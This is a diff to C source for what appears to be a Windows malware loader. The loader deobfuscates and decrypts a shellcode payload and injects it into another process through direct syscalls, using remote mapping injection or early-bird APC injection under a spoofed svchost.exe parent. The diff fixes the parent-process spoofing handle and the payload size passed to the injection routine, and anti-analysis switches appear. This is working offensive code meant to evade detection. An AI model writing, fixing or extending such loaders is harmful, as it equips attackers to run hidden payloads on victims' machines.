@@ -16,7 +16,7 @@
 /// Comment for mapping injection
 #define APC_INJECTION
 #define SPOOFED_PARENT_PROCESS L"svchost.exe"
-#define SACRIFICIAL_PROCESS L"RuntimeBroker.exe"
+#define SACRIFICIAL_PROCESS "RuntimeBroker.exe -Embedding"
 
 int main() {
 	// Init syscalls for use
@@ -49,6 +49,7 @@ int main() {
 	SIZE_T sPayloadSize = 0;
 	DWORD dwPid = 0;
 	HANDLE hProcess = NULL;
+	HANDLE hSpoofedParentProcess = NULL;
 	HANDLE hThread = NULL;
 
 	#ifdef ANTI_ANALYSIS
@@ -95,6 +96,9 @@ int main() {
 	GETCHAR();
 	CopyMemoryEx(pAllocatedAddress, DeobfuscatedPayloadBuffer, DeobfuscatedPayloadSize);
 
+	// Update the payload size
+	sPayloadSize = DeobfuscatedPayloadSize;	
+
 	// Decrypting the payload
 	PRINTA("[#] Press <Enter> To Decrypt The Payload ... ");
 	GETCHAR();
@@ -123,6 +127,7 @@ int main() {
 			}
 			PRINTW(L"[+] Found Taget Process: %ls with PID: %d And Handle: %p!\n", TARGET_PROCESS, dwPid, hProcess);
 
+			// Attack
 			RemoteMappingInjectionViaSyscalls(
 				hProcess,
 				pPayloadAddress,
@@ -132,32 +137,14 @@ int main() {
 		#else 
 			// Process enumeration
 			PRINTA("[i] Enumerating Processes...\n");
-			if (GetRemoteProcessHandle(SPOOFED_PARENT_PROCESS, &dwPid, &hProcess) != TRUE) {
+			if (GetRemoteProcessHandle(SPOOFED_PARENT_PROCESS, &dwPid, &hSpoofedParentProcess) != TRUE) {
 				PRINTW(L"[!] Failed To Find Spoofed Parent Process %ls\n", SPOOFED_PARENT_PROCESS);
 				return -1;
 			}
-			PRINTW(L"[+] Found Spoofed Parent Process: %ls with PID: %d And Handle: %p!\n", SPOOFED_PARENT_PROCESS, dwPid, hProcess);
-
-			// Create the sacrificial process
-			/*
-				ERROR: 
-				[!] CreateProcessA Failed with Error : 2
-				[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : 2
-			*/
-			if (!CreatePPidSpoofedAndSuspendedProcess(hProcess, SACRIFICIAL_PROCESS, &dwPid, hProcess, hThread)) {
-				PRINTA("[!] CreatePPidSpoofedAndSuspendedProcess Failed With Error : %d \n", GetLastError());
-				return -1;
-			}
-			PRINTA("[+] Created Sacrificial Process: %ls with PID: %d And Handle: %p!\n", SACRIFICIAL_PROCESS, dwPid, hProcess);
-
-			// Inject the shellcode to the sacrificial process
-			if (!InjectShellcodeToRemoteProcess(hProcess, pPayloadAddress, sPayloadSize, NULL)) {
-				PRINTA("[!] InjectShellcodeToRemoteProcess Failed With Error : %d \n", GetLastError());
-				return -1;
-			}
+			PRINTW(L"[+] Found Spoofed Parent Process: %ls with PID: %d And Handle: %p!\n", SPOOFED_PARENT_PROCESS, dwPid, hSpoofedParentProcess);
 
 			// Attack
-			if (!RemoteEarlyBirdApcInjectionViaSyscalls(hProcess, SACRIFICIAL_PROCESS, pPayloadAddress, sPayloadSize)) {
+			if (!RemoteEarlyBirdApcInjectionViaSyscalls(hSpoofedParentProcess, SACRIFICIAL_PROCESS, pAllocatedAddress, sPayloadSize)) {
 				PRINTA("[!] RemoteEarlyBirdApcInjectionViaSyscalls Failed With Error : %d \n", GetLastError());
 				return -1;
 			}
